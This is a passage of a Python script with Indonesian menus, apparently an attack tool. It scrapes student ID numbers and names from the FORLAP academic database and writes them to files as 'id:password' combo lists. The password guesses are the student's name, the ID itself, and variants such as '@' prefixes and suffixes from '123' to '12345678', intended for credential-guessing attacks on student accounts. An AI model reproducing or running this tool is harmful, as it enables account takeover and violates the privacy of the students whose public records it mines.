                print(f'{NC}•    {DR}Kesalahan Input{DW}..!!{NC}')
                sleep(1)
                mm()
            elif Pilih_MenuGrab == '8':
              apa = input(f'{NC} • {DC}1{DW}) {DG}Single {DW}| {DC}2{DW}) {DG}Multi {DW}=> {NC}')
              if apa == '':
                print(f'{NC}•    {DR}Kesalahan Input{DW}..!!{NC}')
                sleep(1)
                mm()
              elif apa == '1':
                anu1 = input(f'{NC} • {R}Masukan {Y}Link{NC} =>{DW} ')
                path = input(f'{NC} • {R}File {Y}Output{NC} =>{DW} ')
                cuk = input(f'{NC} • {Y}(i){NC} =>{DW} ')
                print(f'{NC} • • • • • • • • • • • • • • • • • • • {BW}  FORLAP  {NC}')
                nimz1(anu1)
                for _ in range(len(dapat)):
                  _nim_ = json.loads(json.dumps(dapat[_]))['nim']
                  _potnama_ = json.loads(json.dumps(dapat[_]))['nama']
                  _nama_ = _potnama_.split(' ')
                  with open(path, 'a') as o_:
                    o_.write(_nim_+':'+_nama_[0].title()+cuk+'\n')
                doneGrab()
              elif apa == '2':
                anu1 = input(f'{NC} • {R}Masukan {Y}Link{NC} =>{DW} ')
                path = input(f'{NC} • {R}File {Y}Output{NC} =>{DW} ')
                cuk = input(f'{NC} • {Y}(i){NC} =>{DW} ')
                print(f'{NC} • • • • • • • • • • • • • • • • • • • {BW}  FORLAP  {NC}')
                nimz2(anu1)
                for _ in range(len(dapat)):
                  _nim_ = json.loads(json.dumps(dapat[_]))['nim']
                  _potnama_ = json.loads(json.dumps(dapat[_]))['nama']
                  _nama_ = _potnama_.split(' ')
                  with open(path, 'a') as o_:
                    o_.write(_nim_+':'+_nama_[0].title()+cuk+'\n')
                doneGrab()
              else:
                print(f'{NC}•    {DR}Kesalahan Input{DW}..!!{NC}')
                sleep(1)
                mm()
            elif Pilih_MenuGrab == '9':
              apa = input(f'{NC} • {DC}1{DW}) {DG}Single {DW}| {DC}2{DW}) {DG}Multi {DW}=> {NC}')
              if apa == '':
                print(f'{NC}•    {DR}Kesalahan Input{DW}..!!{NC}')
                sleep(1)
                mm()
              elif apa == '1':
                anu1 = input(f'{NC} • {R}Masukan {Y}Link{NC} =>{DW} ')
                path = input(f'{NC} • {R}File {Y}Output{NC} =>{DW} ')
                cuk = input(f'{NC} • {Y}(i){NC} =>{DW} ')
                print(f'{NC} • • • • • • • • • • • • • • • • • • • {BW}  FORLAP  {NC}')
                nimz1(anu1)
                for _ in range(len(dapat)):
                  _nim_ = json.loads(json.dumps(dapat[_]))['nim']
                  _potnama_ = json.loads(json.dumps(dapat[_]))['nama']
                  _nama_ = _potnama_.split(' ')
                  with open(path, 'a') as o_:
                    o_.write(_nim_+':@'+_nama_[0].lower()+cuk+'\n')
                doneGrab()
              elif apa == '2':
                anu1 = input(f'{NC} • {R}Masukan {Y}Link{NC} =>{DW} ')
                path = input(f'{NC} • {R}File {Y}Output{NC} =>{DW} ')
                cuk = input(f'{NC} • {Y}(i){NC} =>{DW} ')
                print(f'{NC} • • • • • • • • • • • • • • • • • • • {BW}  FORLAP  {NC}')
                nimz2(anu1)
                for _ in range(len(dapat)):
                  _nim_ = json.loads(json.dumps(dapat[_]))['nim']
                  _potnama_ = json.loads(json.dumps(dapat[_]))['nama']
                  _nama_ = _potnama_.split(' ')
                  with open(path, 'a') as o_:
                    o_.write(_nim_+':@'+_nama_[0].lower()+cuk+'\n')
                doneGrab()
              else:
                print(f'{NC}•    {DR}Kesalahan Input{DW}..!!{NC}')
                sleep(1)
                mm()
            elif Pilih_MenuGrab == '10':
              apa = input(f'{NC} • {DC}1{DW}) {DG}Single {DW}| {DC}2{DW}) {DG}Multi {DW}=> {NC}')
              if apa == '':
                print(f'{NC}•    {DR}Kesalahan Input{DW}..!!{NC}')
                sleep(1)
                mm()
              elif apa == '1':
                anu1 = input(f'{NC} • {R}Masukan {Y}Link{NC} =>{DW} ')
                path = input(f'{NC} • {R}File {Y}Output{NC} =>{DW} ')
                cuk = input(f'{NC} • {Y}(i){NC} =>{DW} ')
                print(f'{NC} • • • • • • • • • • • • • • • • • • • {BW}  FORLAP  {NC}')
                nimz1(anu1)
                for _ in range(len(dapat)):
                  _nim_ = json.loads(json.dumps(dapat[_]))['nim']
                  _potnama_ = json.loads(json.dumps(dapat[_]))['nama']
                  _nama_ = _potnama_.split(' ')
                  with open(path, 'a') as o_:
                    o_.write(_nim_+':@'+_nama_[0].title()+cuk+'\n')
                doneGrab()
              elif apa == '2':
                anu1 = input(f'{NC} • {R}Masukan {Y}Link{NC} =>{DW} ')
                path = input(f'{NC} • {R}File {Y}Output{NC} =>{DW} ')
                cuk = input(f'{NC} • {Y}(i){NC} =>{DW} ')
                print(f'{NC} • • • • • • • • • • • • • • • • • • • {BW}  FORLAP  {NC}')
                nimz2(anu1)
                for _ in range(len(dapat)):
                  _nim_ = json.loads(json.dumps(dapat[_]))['nim']
                  _potnama_ = json.loads(json.dumps(dapat[_]))['nama']
                  _nama_ = _potnama_.split(' ')
                  with open(path, 'a') as o_:
                    o_.write(_nim_+':@'+_nama_[0].title()+cuk+'\n')
                doneGrab()
              else:
                print(f'{NC}•    {DR}Kesalahan Input{DW}..!!{NC}')
                sleep(1)
                mm()
            elif Pilih_MenuGrab == '11':
              apa = input(f'{NC} • {DC}1{DW}) {DG}Single {DW}| {DC}2{DW}) {DG}Multi {DW}=> {NC}')
              if apa == '':
                print(f'{NC}•    {DR}Kesalahan Input{DW}..!!{NC}')
                sleep(1)
                mm()
              elif apa == '1':
                anu1 = input(f'{NC} • {R}Masukan {Y}Link{NC} =>{DW} ')
                path = input(f'{NC} • {R}File {Y}Output{NC} =>{DW} ')
                cuk = input(f'{NC} • {Y}(i){NC} =>{DW} ')
                print(f'{NC} • • • • • • • • • • • • • • • • • • • {BW}  FORLAP  {NC}')
                nimz1(anu1)
                for _ in range(len(dapat)):
                  _nim_ = json.loads(json.dumps(dapat[_]))['nim']
                  _potnama_ = json.loads(json.dumps(dapat[_]))['nama']
                  _nama_ = _potnama_.replace(' ', '.').lower()
                  try:
                    with open(path, 'a') as o_:
                     o_.write(_nim_+':'+_nama_.split('.')[0]+cuk+'\n')
                     o_.write(_nim_+':'+_nama_.split('.')[1]+cuk+'\n')
                     o_.write(_nim_+':'+_nama_.split('.')[2]+cuk+'\n')
                     o_.write(_nim_+':'+_nama_.split('.')[3]+cuk+'\n')
                  except: ()
                doneGrab()
              elif apa == '2':
                anu1 = input(f'{NC} • {R}Masukan {Y}Link{NC} =>{DW} ')
                path = input(f'{NC} • {R}File {Y}Output{NC} =>{DW} ')
                cuk = input(f'{NC} • {Y}(i){NC} =>{DW} ')
                print(f'{NC} • • • • • • • • • • • • • • • • • • • {BW}  FORLAP  {NC}')
                nimz2(anu1)
                for _ in range(len(dapat)):
                  _nim_ = json.loads(json.dumps(dapat[_]))['nim']
                  _potnama_ = json.loads(json.dumps(dapat[_]))['nama']
                  _nama_ = _potnama_.replace(' ', '.').lower()
                  try:
                    with open(path, 'a') as o_:
                     o_.write(_nim_+':'+_nama_.split('.')[0]+cuk+'\n')
                     o_.write(_nim_+':'+_nama_.split('.')[1]+cuk+'\n')
                     o_.write(_nim_+':'+_nama_.split('.')[2]+cuk+'\n')
                     o_.write(_nim_+':'+_nama_.split('.')[3]+cuk+'\n')
                  except: ()
                doneGrab()
              else:
                print(f'{NC}•    {DR}Kesalahan Input{DW}..!!{NC}')
                sleep(1)
                mm()
            elif Pilih_MenuGrab == '12':
              apa = input(f'{NC} • {DC}1{DW}) {DG}Single {DW}| {DC}2{DW}) {DG}Multi {DW}=> {NC}')
              if apa == '':
                print(f'{NC}•    {DR}Kesalahan Input{DW}..!!{NC}')
                sleep(1)
                mm()
              elif apa == '1':
                anu1 = input(f'{NC} • {R}Masukan {Y}Link{NC} =>{DW} ')
                path = input(f'{NC} • {R}File {Y}Output{NC} =>{DW} ')
                cuk = input(f'{NC} • {Y}(i){NC} =>{DW} ')
                print(f'{NC} • • • • • • • • • • • • • • • • • • • {BW}  FORLAP  {NC}')
                nimz1(anu1)
                for _ in range(len(dapat)):
                  _nim_ = json.loads(json.dumps(dapat[_]))['nim']
                  _potnama_ = json.loads(json.dumps(dapat[_]))['nama']
                  _nama_ = _potnama_.replace(' ', '.').title()
                  try:
                    with open(path, 'a') as o_:
                     o_.write(_nim_+':'+_nama_.split('.')[0]+cuk+'\n')
                     o_.write(_nim_+':'+_nama_.split('.')[1]+cuk+'\n')
                     o_.write(_nim_+':'+_nama_.split('.')[2]+cuk+'\n')
                     o_.write(_nim_+':'+_nama_.split('.')[3]+cuk+'\n')
                  except: ()
                doneGrab()
              elif apa == '2':
                anu1 = input(f'{NC} • {R}Masukan {Y}Link{NC} =>{DW} ')
                path = input(f'{NC} • {R}File {Y}Output{NC} =>{DW} ')
                cuk = input(f'{NC} • {Y}(i){NC} =>{DW} ')
                print(f'{NC} • • • • • • • • • • • • • • • • • • • {BW}  FORLAP  {NC}')
                nimz2(anu1)
                for _ in range(len(dapat)):
                  _nim_ = json.loads(json.dumps(dapat[_]))['nim']
                  _potnama_ = json.loads(json.dumps(dapat[_]))['nama']
                  _nama_ = _potnama_.replace(' ', '.').title()
                  try:
                    with open(path, 'a') as o_:
                     o_.write(_nim_+':'+_nama_.split('.')[0]+cuk+'\n')
                     o_.write(_nim_+':'+_nama_.split('.')[1]+cuk+'\n')
                     o_.write(_nim_+':'+_nama_.split('.')[2]+cuk+'\n')
                     o_.write(_nim_+':'+_nama_.split('.')[3]+cuk+'\n')
                  except: ()
                doneGrab()
              else:
                print(f'{NC}•    {DR}Kesalahan Input{DW}..!!{NC}')
                sleep(1)
                mm()
            elif Pilih_MenuGrab == '13':
              apa = input(f'{NC} • {DC}1{DW}) {DG}Single {DW}| {DC}2{DW}) {DG}Multi {DW}=> {NC}')
              if apa == '':
                print(f'{NC}•    {DR}Kesalahan Input{DW}..!!{NC}')
                sleep(1)
                mm()
              elif apa == '1':
                anu1 = input(f'{NC} • {R}Masukan {Y}Link{NC} =>{DW} ')
                path = input(f'{NC} • {R}File {Y}Output{NC} =>{DW} ')
                cuk = input(f'{NC} • {Y}(i){NC} =>{DW} ')
                print(f'{NC} • • • • • • • • • • • • • • • • • • • {BW}  FORLAP  {NC}')
                nimz1(anu1)
                for _ in range(len(dapat)):
                  _nim_ = json.loads(json.dumps(dapat[_]))['nim']
                  _potnama_ = json.loads(json.dumps(dapat[_]))['nama']
                  _nama_ = _potnama_.replace(' ', '.').lower()
                  try:
                    with open(path, 'a') as o_:
                     o_.write(_nama_+':'+_nama_.split('.')[1]+cuk+'\n')
                     o_.write(_nama_+':'+_nama_.split('.')[2]+cuk+'\n')
                  except: ()
                doneGrab()
              elif apa == '2':
                anu1 = input(f'{NC} • {R}Masukan {Y}Link{NC} =>{DW} ')
                path = input(f'{NC} • {R}File {Y}Output{NC} =>{DW} ')
                cuk = input(f'{NC} • {Y}(i){NC} =>{DW} ')
                print(f'{NC} • • • • • • • • • • • • • • • • • • • {BW}  FORLAP  {NC}')
                nimz2(anu1)
                for _ in range(len(dapat)):
                  _nim_ = json.loads(json.dumps(dapat[_]))['nim']
                  _potnama_ = json.loads(json.dumps(dapat[_]))['nama']
                  _nama_ = _potnama_.replace(' ', '.').lower()
                  try:
                    with open(path, 'a') as o_:
                     o_.write(_nama_+':'+_nama_.split('.')[1]+cuk+'\n')
                     o_.write(_nama_+':'+_nama_.split('.')[2]+cuk+'\n')
                  except: ()
                doneGrab()
              else:
                print(f'{NC}•    {DR}Kesalahan Input{DW}..!!{NC}')
                sleep(1)
                mm()
            elif Pilih_MenuGrab == '14':
              apa = input(f'{NC} • {DC}1{DW}) {DG}Single {DW}| {DC}2{DW}) {DG}Multi {DW}=> {NC}')
              if apa == '':
                print(f'{NC}•    {DR}Kesalahan Input{DW}..!!{NC}')
                sleep(1)
                mm()
              elif apa == '1':
                anu1 = input(f'{NC} • {R}Masukan {Y}Link{NC} =>{DW} ')
                path = input(f'{NC} • {R}File {Y}Output{NC} =>{DW} ')
                cuk = input(f'{NC} • {Y}(i){NC} =>{DW} ')
                print(f'{NC} • • • • • • • • • • • • • • • • • • • {BW}  FORLAP  {NC}')
                nimz1(anu1)
                for _ in range(len(dapat)):
                  _nim_ = json.loads(json.dumps(dapat[_]))['nim']
                  _potnama_ = json.loads(json.dumps(dapat[_]))['nama']
                  _nama_1 = _potnama_.replace(' ', '.').lower()
                  _nama_2 = _potnama_.replace(' ', '.').title()
                  try:
                    with open(path, 'a') as o_:
                     o_.write(_nama_1+':'+_nama_2.split('.')[1]+cuk+'\n')
                     o_.write(_nama_1+':'+_nama_2.split('.')[2]+cuk+'\n')
                  except: ()
                doneGrab()
              elif apa == '2':
                anu1 = input(f'{NC} • {R}Masukan {Y}Link{NC} =>{DW} ')
                path = input(f'{NC} • {R}File {Y}Output{NC} =>{DW} ')
                cuk = input(f'{NC} • {Y}(i){NC} =>{DW} ')
                print(f'{NC} • • • • • • • • • • • • • • • • • • • {BW}  FORLAP  {NC}')
                nimz2(anu1)
                for _ in range(len(dapat)):
                  _nim_ = json.loads(json.dumps(dapat[_]))['nim']
                  _potnama_ = json.loads(json.dumps(dapat[_]))['nama']
                  _nama_1 = _potnama_.replace(' ', '.').lower()
                  _nama_2 = _potnama_.replace(' ', '.').title()
                  try:
                    with open(path, 'a') as o_:
                     o_.write(_nama_1+':'+_nama_2.split('.')[1]+cuk+'\n')
                     o_.write(_nama_1+':'+_nama_2.split('.')[2]+cuk+'\n')
                  except: ()
                doneGrab()
              else:
                print(f'{NC}•    {DR}Kesalahan Input{DW}..!!{NC}')
                sleep(1)
                mm()
            elif Pilih_MenuGrab == '15':
              apa = input(f'{NC} • {DC}1{DW}) {DG}Single {DW}| {DC}2{DW}) {DG}Multi {DW}=> {NC}')
              if apa == '':
                print(f'{NC}•    {DR}Kesalahan Input{DW}..!!{NC}')
                sleep(1)
                mm()
              elif apa == '1':
                anu1 = input(f'{NC} • {R}Masukan {Y}Link{NC} =>{DW} ')
                path = input(f'{NC} • {R}File {Y}Output{NC} =>{DW} ')
                cuk = input(f'{NC} • {Y}(i){NC} =>{DW} ')
                print(f'{NC} • • • • • • • • • • • • • • • • • • • {BW}  FORLAP  {NC}')
                nimz1(anu1)
                for _ in range(len(dapat)):
                  _nim_ = json.loads(json.dumps(dapat[_]))['nim']
                  _potnama_ = json.loads(json.dumps(dapat[_]))['nama']
                  _nama_ = _potnama_.split(' ')
                  with open(path, 'a') as o_:
                    o_.write(_nim_+':'+cuk+'\n')
                doneGrab()
              elif apa == '2':
                anu1 = input(f'{NC} • {R}Masukan {Y}Link{NC} =>{DW} ')
                path = input(f'{NC} • {R}File {Y}Output{NC} =>{DW} ')
                cuk = input(f'{NC} • {Y}(i){NC} =>{DW} ')
                print(f'{NC} • • • • • • • • • • • • • • • • • • • {BW}  FORLAP  {NC}')
                nimz2(anu1)
                for _ in range(len(dapat)):
                  _nim_ = json.loads(json.dumps(dapat[_]))['nim']
                  _potnama_ = json.loads(json.dumps(dapat[_]))['nama']
                  _nama_ = _potnama_.split(' ')
                  with open(path, 'a') as o_:
                    o_.write(_nim_+':'+cuk+'\n')
                doneGrab()
              else:
                print(f'{NC}•    {DR}Kesalahan Input{DW}..!!{NC}')
                sleep(1)
                mm()
            elif Pilih_MenuGrab == '16':
              apa = input(f'{NC} • {DC}1{DW}) {DG}Single {DW}| {DC}2{DW}) {DG}Multi {DW}=> {NC}')
              if apa == '':
                print(f'{NC}•    {DR}Kesalahan Input{DW}..!!{NC}')
                sleep(1)
                mm()
              elif apa == '1':
                anu1 = input(f'{NC} • {R}Masukan {Y}Link{NC} =>{DW} ')
                path = input(f'{NC} • {R}File {Y}Output{NC} =>{DW} ')
                cuk1 = input(f'{NC} • {Y}(i) 1{NC} =>{DW} ')
                cuk2 = input(f'{NC} • {Y}(i) 2{NC} =>{DW} ')
                print(f'{NC} • • • • • • • • • • • • • • • • • • • {BW}  FORLAP  {NC}')
                nimz1(anu1)
                for _ in range(len(dapat)):
                  _nim_ = json.loads(json.dumps(dapat[_]))['nim']
                  _potnama_ = json.loads(json.dumps(dapat[_]))['nama']
                  _nama_ = _potnama_.replace(' ', '.').lower()
                  with open(path, 'a') as o_:
                    o_.write(_nama_.split('.')[0]+cuk1+':'+_nama_.split('.')[0]+cuk2+'\n')
                doneGrab()
              elif apa == '2':
                anu1 = input(f'{NC} • {R}Masukan {Y}Link{NC} =>{DW} ')
                path = input(f'{NC} • {R}File {Y}Output{NC} =>{DW} ')
                cuk1 = input(f'{NC} • {Y}(i) 1{NC} =>{DW} ')
                cuk2 = input(f'{NC} • {Y}(i) 2{NC} =>{DW} ')
                print(f'{NC} • • • • • • • • • • • • • • • • • • • {BW}  FORLAP  {NC}')
                nimz2(anu1)
                for _ in range(len(dapat)):
                  _nim_ = json.loads(json.dumps(dapat[_]))['nim']
                  _potnama_ = json.loads(json.dumps(dapat[_]))['nama']
                  _nama_ = _potnama_.replace(' ', '.').lower()
                  with open(path, 'a') as o_:
                    o_.write(_nama_.split('.')[0]+cuk1+':'+_nama_.split('.')[0]+cuk2+'\n')
                doneGrab()
              else:
                print(f'{NC}•    {DR}Kesalahan Input{DW}..!!{NC}')
                sleep(1)
                mm()
            elif Pilih_MenuGrab == '17':
              apa = input(f'{NC} • {DC}1{DW}) {DG}Single {DW}| {DC}2{DW}) {DG}Multi {DW}=> {NC}')
              if apa == '':
                print(f'{NC}•    {DR}Kesalahan Input{DW}..!!{NC}')
                sleep(1)
                mm()
              elif apa == '1':
                anu1 = input(f'{NC} • {R}Masukan {Y}Link{NC} =>{DW} ')
                path = input(f'{NC} • {R}File {Y}Output{NC} =>{DW} ')
                cuk1 = input(f'{NC} • {Y}(i) 1{NC} =>{DW} ')
                cuk2 = input(f'{NC} • {Y}(i) 2{NC} =>{DW} ')
                print(f'{NC} • • • • • • • • • • • • • • • • • • • {BW}  FORLAP  {NC}')
                nimz1(anu1)
                for _ in range(len(dapat)):
                  _nim_ = json.loads(json.dumps(dapat[_]))['nim']
                  _potnama_ = json.loads(json.dumps(dapat[_]))['nama']
                  _nama_1 = _potnama_.replace(' ', '.').lower()
                  _nama_2 = _potnama_.replace(' ', '.').title()
                  with open(path, 'a') as o_:
                    o_.write(_nama_1.split('.')[0]+cuk1+':'+_nama_2.split('.')[0]+cuk2+'\n')
                doneGrab()
              elif apa == '2':
                anu1 = input(f'{NC} • {R}Masukan {Y}Link{NC} =>{DW} ')
                path = input(f'{NC} • {R}File {Y}Output{NC} =>{DW} ')
                cuk1 = input(f'{NC} • {Y}(i) 1{NC} =>{DW} ')
                cuk2 = input(f'{NC} • {Y}(i) 2{NC} =>{DW} ')
                print(f'{NC} • • • • • • • • • • • • • • • • • • • {BW}  FORLAP  {NC}')
                nimz2(anu1)
                for _ in range(len(dapat)):
                  _nim_ = json.loads(json.dumps(dapat[_]))['nim']
                  _potnama_ = json.loads(json.dumps(dapat[_]))['nama']
                  _nama_1 = _potnama_.replace(' ', '.').lower()
                  _nama_2 = _potnama_.replace(' ', '.').title()
                  with open(path, 'a') as o_:
                    o_.write(_nama_1.split('.')[0]+cuk1+':'+_nama_2.split('.')[0]+cuk2+'\n')
                doneGrab()
              else:
                print(f'{NC}•    {DR}Kesalahan Input{DW}..!!{NC}')
                sleep(1)
                mm()
            elif Pilih_MenuGrab == '18':
              apa = input(f'{NC} • {DC}1{DW}) {DG}Single {DW}| {DC}2{DW}) {DG}Multi {DW}=> {NC}')
              if apa == '':
                print(f'{NC}•    {DR}Kesalahan Input{DW}..!!{NC}')
                sleep(1)
                mm()
              elif apa == '1':
                anu1 = input(f'{NC} • {R}Masukan {Y}Link{NC} =>{DW} ')
                path = input(f'{NC} • {R}File {Y}Output{NC} =>{DW} ')
                cuk = input(f'{NC} • {Y}(i){NC} =>{DW} ')
                print(f'{NC} • • • • • • • • • • • • • • • • • • • {BW}  FORLAP  {NC}')
                nimz1(anu1)
                for _ in range(len(dapat)):
                  _nim_ = json.loads(json.dumps(dapat[_]))['nim']
                  _potnama_ = json.loads(json.dumps(dapat[_]))['nama']
                  _nama_ = _potnama_.replace(' ', '.').lower()
                  with open(path, 'a') as o_:
                    o_.write(_nama_+':'+cuk+'\n')
                doneGrab()
              elif apa == '2':
                anu1 = input(f'{NC} • {R}Masukan {Y}Link{NC} =>{DW} ')
                path = input(f'{NC} • {R}File {Y}Output{NC} =>{DW} ')
                cuk = input(f'{NC} • {Y}(i){NC} =>{DW} ')
                print(f'{NC} • • • • • • • • • • • • • • • • • • • {BW}  FORLAP  {NC}')
                nimz2(anu1)
                for _ in range(len(dapat)):
                  _nim_ = json.loads(json.dumps(dapat[_]))['nim']
                  _potnama_ = json.loads(json.dumps(dapat[_]))['nama']
                  _nama_ = _potnama_.replace(' ', '.').lower()
                  with open(path, 'a') as o_:
                    o_.write(_nama_+':'+cuk+'\n')
                doneGrab()
              else:
                print(f'{NC}•    {DR}Kesalahan Input{DW}..!!{NC}')
                sleep(1)
                mm()
            elif Pilih_MenuGrab == '19':
              apa = input(f'{NC} • {DC}1{DW}) {DG}Single {DW}| {DC}2{DW}) {DG}Multi {DW}=> {NC}')
              if apa == '':
                print(f'{NC}•    {DR}Kesalahan Input{DW}..!!{NC}')
                sleep(1)
                mm()
              elif apa == '1':
                anu1 = input(f'{NC} • {R}Masukan {Y}Link{NC} =>{DW} ')
                path = input(f'{NC} • {R}File {Y}Output{NC} =>{DW} ')
                print(f'{NC} • • • • • • • • • • • • • • • • • • • {BW}  FORLAP  {NC}')
                nimz1(anu1)
                for _ in range(len(dapat)):
                  _nim_ = json.loads(json.dumps(dapat[_]))['nim']
                  _potnama_ = json.loads(json.dumps(dapat[_]))['nama']
                  _nama_ = _potnama_.split(' ')
                  with open(path, 'a') as o_:
                    o_.write(_nim_+':'+_nim_+'\n')
                    o_.write(_nim_+':'+_nama_[0].lower()+'\n')
                    o_.write(_nim_+':'+_nama_[0].title()+'\n')
                    o_.write(_nim_+':@'+_nama_[0].lower()+'\n')
                    o_.write(_nim_+':@'+_nama_[0].title()+'\n')
                    o_.write(_nim_+':'+_nama_[0].lower()+'123\n')
                    o_.write(_nim_+':'+_nama_[0].title()+'123\n')
                    o_.write(_nim_+':@'+_nama_[0].lower()+'123\n')
                    o_.write(_nim_+':@'+_nama_[0].title()+'123\n')
                    o_.write(_nim_+':'+_nama_[0].lower()+'1234\n')
                    o_.write(_nim_+':'+_nama_[0].title()+'1234\n')
                    o_.write(_nim_+':@'+_nama_[0].lower()+'1234\n')
                    o_.write(_nim_+':@'+_nama_[0].title()+'1234\n')
                    o_.write(_nim_+':'+_nama_[0].lower()+'12345\n')
                    o_.write(_nim_+':'+_nama_[0].title()+'12345\n')
                    o_.write(_nim_+':@'+_nama_[0].lower()+'12345\n')
                    o_.write(_nim_+':@'+_nama_[0].title()+'12345\n')
                    o_.write(_nim_+':'+_nama_[0].lower()+'123456\n')
                    o_.write(_nim_+':'+_nama_[0].title()+'123456\n')
                    o_.write(_nim_+':@'+_nama_[0].lower()+'123456\n')
                    o_.write(_nim_+':@'+_nama_[0].title()+'123456\n')
                    o_.write(_nim_+':'+_nama_[0].lower()+'1234567\n')
                    o_.write(_nim_+':'+_nama_[0].title()+'1234567\n')
                    o_.write(_nim_+':@'+_nama_[0].lower()+'1234567\n')
                    o_.write(_nim_+':@'+_nama_[0].title()+'1234567\n')
                    o_.write(_nim_+':'+_nama_[0].lower()+'12345678\n')
                    o_.write(_nim_+':'+_nama_[0].title()+'12345678\n')
                    o_.write(_nim_+':@'+_nama_[0].lower()+'12345678\n')
                    o_.write(_nim_+':@'+_nama_[0].title()+'12345678\n')
                doneGrab()
              elif apa == '2':
                anu1 = input(f'{NC} • {R}Masukan {Y}Link{NC} =>{DW} ')
                path = input(f'{NC} • {R}File {Y}Output{NC} =>{DW} ')
                print(f'{NC} • • • • • • • • • • • • • • • • • • • {BW}  FORLAP  {NC}')
                nimz2(anu1)
                for _ in range(len(dapat)):
                  _nim_ = json.loads(json.dumps(dapat[_]))['nim']
                  _potnama_ = json.loads(json.dumps(dapat[_]))['nama']
                  _nama_ = _potnama_.split(' ')
                  with open(path, 'a') as o_:
                    o_.write(_nim_+':'+_nim_+'\n')
                    o_.write(_nim_+':'+_nama_[0].lower()+'\n')
                    o_.write(_nim_+':'+_nama_[0].title()+'\n')
                    o_.write(_nim_+':@'+_nama_[0].lower()+'\n')
                    o_.write(_nim_+':@'+_nama_[0].title()+'\n')
                    o_.write(_nim_+':'+_nama_[0].lower()+'123\n')
                    o_.write(_nim_+':'+_nama_[0].title()+'123\n')
                    o_.write(_nim_+':@'+_nama_[0].lower()+'123\n')
                    o_.write(_nim_+':@'+_nama_[0].title()+'123\n')
                    o_.write(_nim_+':'+_nama_[0].lower()+'1234\n')
                    o_.write(_nim_+':'+_nama_[0].title()+'1234\n')
                    o_.write(_nim_+':@'+_nama_[0].lower()+'1234\n')
                    o_.write(_nim_+':@'+_nama_[0].title()+'1234\n')
                    o_.write(_nim_+':'+_nama_[0].lower()+'12345\n')
                    o_.write(_nim_+':'+_nama_[0].title()+'12345\n')
                    o_.write(_nim_+':@'+_nama_[0].lower()+'12345\n')
                    o_.write(_nim_+':@'+_nama_[0].title()+'12345\n')
                    o_.write(_nim_+':'+_nama_[0].lower()+'123456\n')
                    o_.write(_nim_+':'+_nama_[0].title()+'123456\n')
                    o_.write(_nim_+':@'+_nama_[0].lower()+'123456\n')
                    o_.write(_nim_+':@'+_nama_[0].title()+'123456\n')
                    o_.write(_nim_+':'+_nama_[0].lower()+'1234567\n')
                    o_.write(_nim_+':'+_nama_[0].title()+'1234567\n')
                    o_.write(_nim_+':@'+_nama_[0].lower()+'1234567\n')
                    o_.write(_nim_+':@'+_nama_[0].title()+'1234567\n')
                    o_.write(_nim_+':'+_nama_[0].lower()+'12345678\n')
                    o_.write(_nim_+':'+_nama_[0].title()+'12345678\n')
                    o_.write(_nim_+':@'+_nama_[0].lower()+'12345678\n')
                    o_.write(_nim_+':@'+_nama_[0].title()+'12345678\n')
                doneGrab()
              else:
                print(f'{NC}•    {DR}Kesalahan Input{DW}..!!{NC}')
                sleep(1)
                mm()
            elif Pilih_MenuGrab == '0':
              mm()
            elif Pilih_MenuGrab == 'x':
              exitst()
            else:
              print(f'{NC}•    {DR}Kesalahan Input{DW}..!!{NC}')
              sleep(1)
              mm()
          elif Pilih_MainMenu == 'x':
            exitst()
          else:
            print(f'{NC}•    {DR}Kesalahan Input{DW}..!!{NC}')
            sleep(1)
            mm()
        except FileNotFoundError:
          print(f'{NC}•    {DY}ERROR {NC}=> {DR}File Tidak Ditemukan{DW}..!!{NC}')
          sleep(1)
          mm()
  except KeyboardInterrupt:
    exit(f'{NC}\r•    {DR}Keyboard Interupted{DW}..!!{NC}')
  except Exception as e:
    try:
      print(f'{NC} •    {DW}=> {DR}Pastikan Terkoneksi Internet{DW}..!!{NC}')
    finally:
      e = None
      del e
      sleep(1)
      exit()
  if __name__ == '__main__':
    mm()

